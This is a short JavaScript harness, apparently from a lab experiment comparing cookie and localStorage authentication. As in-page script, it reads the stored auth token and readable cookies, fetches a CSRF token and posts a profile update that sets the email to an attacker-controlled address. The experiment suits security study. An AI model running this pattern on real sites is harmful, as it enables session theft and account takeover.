// Runs in the page. Script execution is the explicit premise.
export async function executeHarness() {
  const localToken = localStorage.getItem('auth_token');
  const readableCookies = document.cookie;
  const tokenResponse = await fetch('/api/labs/cookie-storage/csrf-token');
  if (!tokenResponse.ok) throw new Error('Login before running the harness');
  const { csrfToken } = await tokenResponse.json();
  const response = await fetch('/api/labs/cookie-storage/profile/update', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken,
      'X-Experiment-Id': 'exp2-auth-mechanisms' },
    body: JSON.stringify({ email: 'attacker-controlled@evil.test' }),
  });
  return { localToken, readableCookies, status: response.status, response: await response.json() };
}
